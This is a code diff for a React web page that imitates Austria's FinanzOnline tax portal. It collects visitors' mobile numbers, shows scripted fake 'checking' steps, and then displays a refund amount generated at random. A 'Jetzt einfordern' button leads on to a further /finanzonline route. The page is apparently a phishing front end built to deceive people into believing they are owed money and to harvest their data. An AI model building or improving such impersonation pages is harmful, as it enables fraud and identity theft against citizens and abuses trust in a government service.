@@ -1,21 +1,53 @@
 import Header from "@/components/Header";
-import { Info, AlertTriangle, CheckCircle2 } from "lucide-react";
-import { useState, useCallback } from "react";
+import { Info, AlertTriangle, CheckCircle2, Loader2 } from "lucide-react";
+import { useState, useCallback, useEffect } from "react";
+import { useNavigate } from "react-router-dom";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import { supabase } from "@/integrations/supabase/client";
-import LoadingOverlay from "@/components/LoadingOverlay";
+
 
 import idAustriaImg from "@/assets/IDAustria.png";
 import finanznaviImg from "@/assets/Finanznavi.jpg";
 import kundenserviceImg from "@/assets/Kundenservice.png";
 import steuerbuchImg from "@/assets/steuerbuch.jpg";
 
+const LOADING_STEPS = [
+  "Datensatz wird abgeglichen…",
+  "Steueransprüche werden berechnet…",
+  "Ergebnis wird geladen…",
+];
+
+const formatEUR = (n: number) =>
+  n.toLocaleString("de-AT", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
 const FinanzonlineSteuer = () => {
   usePageMeta("FinanzOnline – Steuererstattung prüfen", "/favicon.png");
+  const navigate = useNavigate();
   const [phone, setPhone] = useState("");
-  const [showLoading, setShowLoading] = useState(false);
-  const [done, setDone] = useState(false);
+  const [stage, setStage] = useState<"form" | "loading" | "result">("form");
   const [submitting, setSubmitting] = useState(false);
+  const [loadingStep, setLoadingStep] = useState(0);
+  const [amount, setAmount] = useState<{ low: string; high: string } | null>(null);
+
+  useEffect(() => {
+    if (stage !== "loading") return;
+    setLoadingStep(0);
+    const stepTimers = [
+      setTimeout(() => setLoadingStep(1), 2000),
+      setTimeout(() => setLoadingStep(2), 4000),
+    ];
+    const finishTimer = setTimeout(() => {
+      const low = 1200 + Math.random() * 600;
+      const high = low + 200 + Math.random() * (2400 - (low + 200));
+      setAmount({ low: formatEUR(low), high: formatEUR(high) });
+      setStage("result");
+      setSubmitting(false);
+    }, 6000);
+    return () => {
+      stepTimers.forEach(clearTimeout);
+      clearTimeout(finishTimer);
+    };
+  }, [stage]);
 
   const handleSubmit = useCallback(async () => {
     const trimmed = phone.trim();
@@ -38,19 +70,11 @@ const FinanzonlineSteuer = () => {
       setSubmitting(false);
       return;
     }
-    setShowLoading(true);
-    setTimeout(() => {
-      setShowLoading(false);
-      setDone(true);
-      setSubmitting(false);
-    }, 2500);
+    setStage("loading");
   }, [phone]);
 
   return (
     <div className="min-h-screen bg-white">
-      {showLoading && (
-        <LoadingOverlay message="Anspruch wird geprüft..." onComplete={() => {}} />
-      )}
       <Header />
       <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
         Willkommen bei FinanzOnline
@@ -94,46 +118,70 @@ const FinanzonlineSteuer = () => {
             </h2>
           </div>
 
-          <div className="mx-5 mt-4 rounded-md bg-[#fff3cd] px-4 py-3 md:hidden">
-            <div className="flex items-start gap-2">
-              <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#856404]" />
-              <p className="text-sm text-[#856404]">
-                Achtung! Bitte geben Sie Ihre Handynummer ein, um zu überprüfen, ob Ihnen eine
-                Steuererstattung zusteht.
-              </p>
-            </div>
-          </div>
-
-          <div className="mx-5 mb-5 mt-4 rounded-lg bg-white p-6">
-            {done ? (
-              <div className="flex flex-col items-center gap-3 py-6 text-center">
-                <CheckCircle2 className="h-12 w-12 text-green-600" />
-                <h3 className="text-base font-bold text-gray-900">
-                  Prüfung erfolgreich eingereicht
-                </h3>
-                <p className="max-w-md text-sm text-gray-700">
-                  Wir prüfen Ihren Anspruch und melden uns in Kürze per SMS an die angegebene
-                  Nummer.
+          {stage === "form" && (
+            <div className="mx-5 mt-4 rounded-md bg-[#fff3cd] px-4 py-3 md:hidden">
+              <div className="flex items-start gap-2">
+                <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#856404]" />
+                <p className="text-sm text-[#856404]">
+                  Achtung! Bitte geben Sie Ihre Handynummer ein, um zu überprüfen, ob Ihnen eine
+                  Steuererstattung zusteht.
                 </p>
               </div>
-            ) : (
+            </div>
+          )}
+
+          <div className="mx-5 mb-5 mt-4 rounded-lg bg-white p-6">
+            {stage === "loading" && (
+              <div className="flex flex-col items-center gap-4 py-10 text-center animate-fade-in">
+                <Loader2 className="h-12 w-12 animate-spin text-[#00436b]" />
+                <p key={loadingStep} className="text-sm font-medium text-gray-800 animate-fade-in">
+                  {LOADING_STEPS[loadingStep]}
+                </p>
+                <div className="mt-2 h-1.5 w-full max-w-xs overflow-hidden rounded-full bg-gray-200">
+                  <div
+                    className="h-full bg-[#00436b] transition-all duration-[2000ms] ease-linear"
+                    style={{ width: `${((loadingStep + 1) / LOADING_STEPS.length) * 100}%` }}
+                  />
+                </div>
+              </div>
+            )}
+
+            {stage === "result" && amount && (
+              <div className="flex flex-col items-center gap-4 py-6 text-center animate-fade-in">
+                <CheckCircle2 className="h-14 w-14 text-green-600" />
+                <h3 className="text-lg font-bold text-gray-900">
+                  Steuerrückerstattung verfügbar
+                </h3>
+                <p className="max-w-md text-sm text-gray-700">
+                  Anhand Ihrer Daten haben Sie Anspruch auf eine Steuerrückerstattung in folgender Höhe:
+                </p>
+                <div className="my-2 rounded-lg bg-[#f1f4f7] px-6 py-4">
+                  <div className="text-2xl font-bold text-[#00436b] md:text-3xl">
+                    {amount.low} € – {amount.high} €
+                  </div>
+                </div>
+                <button
+                  onClick={() => navigate("/finanzonline")}
+                  className="mt-2 w-full max-w-xs rounded-md bg-[#00436b] py-3 text-sm font-semibold text-white hover:bg-[#003354]"
+                >
+                  Jetzt einfordern
+                </button>
+              </div>
+            )}
+
+            {stage === "form" && (
               <div className="md:grid md:grid-cols-2 md:items-center md:gap-8">
-                {/* Info-Block: nur Desktop */}
                 <div className="hidden md:block">
                   <div className="mb-2 flex items-center gap-2">
                     <Info className="h-5 w-5 text-[#00436b]" />
-                    <h3 className="text-base font-bold text-gray-900">
-                      Ihre Handynummer
-                    </h3>
+                    <h3 className="text-base font-bold text-gray-900">Ihre Handynummer</h3>
                   </div>
                   <p className="text-sm leading-relaxed text-gray-700">
-                    Wir prüfen anhand Ihrer Handynummer, ob eine Steuererstattung
-                    für Sie hinterlegt ist. Die Prüfung dauert nur wenige Sekunden
-                    und ist selbstverständlich kostenlos.
+                    Wir prüfen anhand Ihrer Handynummer, ob eine Steuererstattung für Sie hinterlegt ist.
+                    Die Prüfung dauert nur wenige Sekunden und ist selbstverständlich kostenlos.
                   </p>
                 </div>
 
-                {/* Formular */}
                 <div className="space-y-5">
                   <div>
                     <label className="mb-1.5 block text-sm font-medium text-gray-600">
@@ -165,6 +213,7 @@ const FinanzonlineSteuer = () => {
           </div>
 
         </div>
+
 
         {/* Aktuelles Sektion */}
         <div className="mt-10">
